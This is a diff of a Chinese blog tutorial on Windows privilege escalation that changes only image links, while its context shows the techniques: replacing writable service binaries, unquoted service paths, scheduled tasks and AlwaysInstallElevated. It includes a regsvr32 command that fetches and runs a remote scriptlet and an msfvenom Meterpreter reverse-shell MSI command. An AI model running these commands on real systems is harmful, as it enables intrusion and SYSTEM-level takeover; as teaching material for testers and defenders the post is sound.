@@ -33,7 +33,7 @@ url: /archivers/2018-10-08/1
 
 我选择一个名为`“gwservice”`的项，查看该项下的所有值：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x01.png)
+![](../../../static/images/28c82c82-4f5f-11ec-9e53-00d861bf4abb.png)
 
 其中有一个ImagePath的名称，它的值是：
 
@@ -46,13 +46,13 @@ url: /archivers/2018-10-08/1
 
 但是很遗憾，第1种不行：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x02.png)
+![](../../../static/images/2901bf24-4f5f-11ec-be22-00d861bf4abb.png)
 
 当前用户没有足够的权限。
 
 尝试第二种方法，使用“icacls”命令查看目录权限：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x03.png)
+![](../../../static/images/2942f94e-4f5f-11ec-99bc-00d861bf4abb.png)
 惊喜的发现，`“Everyone”`用户可以读写该目录下所有文件。
 
 Ps:Everyone代指当前主机下所有用户，包含（Guest）
@@ -61,22 +61,22 @@ Ps:Everyone代指当前主机下所有用户，包含（Guest）
 
 首先，我启用了win7的Guest用户，使用Guest用户登录这台机器：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x04.png)
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x05.png)
+![](../../../static/images/297e7e1a-4f5f-11ec-af7b-00d861bf4abb.png)
+![](../../../static/images/29b1286a-4f5f-11ec-93d3-00d861bf4abb.png)
 Ping命令都不让用，限制很死。
 
 使用msf生成一个木马：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x06.png)
+![](../../../static/images/29f12ac8-4f5f-11ec-aa05-00d861bf4abb.png)
 将木马替换为gwservice.exe
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x07.png)
+![](../../../static/images/2a32c9ce-4f5f-11ec-b4b8-00d861bf4abb.png)
 先执行测试一下，能否获得Guest的session：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x08.png)
+![](../../../static/images/2a70111c-4f5f-11ec-bef8-00d861bf4abb.png)
 获得会话后，注销（或重启）Guest用户，登录管理员用户，获得SYSTEM权限：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x09.png)
+![](../../../static/images/2ab054b6-4f5f-11ec-90e5-00d861bf4abb.png)
 提权情况还是要根据服务器本身的环境，我总结的这些方法就是为了优先采用这些方式，而不是直接突突搞EXP ……
 
 ## 0x02 模糊路径提权
@@ -85,7 +85,7 @@ Ping命令都不让用，限制很死。
 
 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services`
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x10.png)
+![](../../../static/images/2af42196-4f5f-11ec-b362-00d861bf4abb.png)
 其中有一个ImagePath的名称，它的值是：
 
 `C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe`
@@ -119,8 +119,8 @@ https://docs.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-proces
 
 可以看看几个比较符合安全规范的例子：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x11.png)
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x12.png)
+![](../../../static/images/2b613d8a-4f5f-11ec-a638-00d861bf4abb.png)
+![](../../../static/images/2b9c0370-4f5f-11ec-9d8d-00d861bf4abb.png)
 
 ImagePath有的会使用系统环境变量，在这里的`“%systemroot%”`指的是`“C:\Windows\”`,普通用户时没办法操作这个环境变量的，而且也没办法修改`“C:\Windows\”`中的文件，因此看起来还是相对比较安全。
 
@@ -139,11 +139,11 @@ ImagePath有的会使用系统环境变量，在这里的`“%systemroot%”`指
 接下来的操作还是使用之前的木马，直接将木马命名为`“Program.exe”`放在`“C:\Program.exe”`，然后重启主机。
 
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x13.png)
+![](../../../static/images/2bd80f78-4f5f-11ec-a67c-00d861bf4abb.png)
 
 此时我们得到的会话已经时“SYSTEM”权限。
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x14.png)
+![](../../../static/images/2c217500-4f5f-11ec-836e-00d861bf4abb.png)
 
 ## 0x03 定时任务计划提权
 
@@ -173,13 +173,13 @@ at 10:45PM /interactive calc.exe
 
 参考文档：https://support.microsoft.com/zh-cn/help/313565/how-to-use-the-at-command-to-schedule-tasks
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x15.png)
+![](../../../static/images/2c79c872-4f5f-11ec-9243-00d861bf4abb.png)
 
 ### 提权过程
 
 可以采用Regsvr32一条命令上线，使用MSF的“multi/script/web_delivery”模块，我的配置如下：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x16.png)
+![](../../../static/images/2cba810a-4f5f-11ec-a375-00d861bf4abb.png)
 ```sh
 regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
 ```
@@ -191,13 +191,13 @@ regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
 at 11:16PM \interactive regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
 ```
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x17.png)
+![](../../../static/images/2d010148-4f5f-11ec-a79d-00d861bf4abb.png)
 但是我发现regsvr32会报错。
 
 只能将木马落地到服务器（Win 2003 SP1）上了，还是采用之前生成的木马。
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x18.png)
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x19.png)
+![](../../../static/images/2d429ffe-4f5f-11ec-9d8f-00d861bf4abb.png)
+![](../../../static/images/2d8178fa-4f5f-11ec-98dc-00d861bf4abb.png)
 此时我们得到的会话已经是“SYSTEM”权限。
 
 ## 0x04 MSI安装策略提权
@@ -216,7 +216,7 @@ at 11:16PM \interactive regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoX
 
 注意:熟练的用户可以利用该设置授予的权限来更改其特权并获得对受限文件和文件夹的永久访问权。请注意，这个设置的“用户配置”版本不一定安全。
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x20.png)
+![](../../../static/images/2dc4dece-4f5f-11ec-9e11-00d861bf4abb.png)
 默认情况下是`“Not Configured”`，如果是`“Enabled”`，可以直接利用于特权提升。
 
 这个配置项对应的注册表路径为：
@@ -224,7 +224,7 @@ at 11:16PM \interactive regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoX
 * HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\windows\Installer
 * HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x21.png)
+![](../../../static/images/2e038ef8-4f5f-11ec-825b-00d861bf4abb.png)
 ### 提权过程
 
 首先我们需要生成一个MSI木马：
@@ -235,10 +235,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.117.134 LPORT=443 -f m
 
 开启一个监听：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x22.png)
+![](../../../static/images/2e448250-4f5f-11ec-b1cb-00d861bf4abb.png)
 将lask.msi复制到Windows中，运行后即可获得SYSTEM权限。
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x23.png)
+![](../../../static/images/2e8e68ca-4f5f-11ec-856a-00d861bf4abb.png)
 参考学习：https://www.anquanke.com/post/id/87
 
 
@@ -294,4 +294,4 @@ Windows操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册�
 
 扫码可免费加入：
 
-![](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-08/0x24.png)
+![](../../../static/images/2ed458f8-4f5f-11ec-92a8-00d861bf4abb.png)
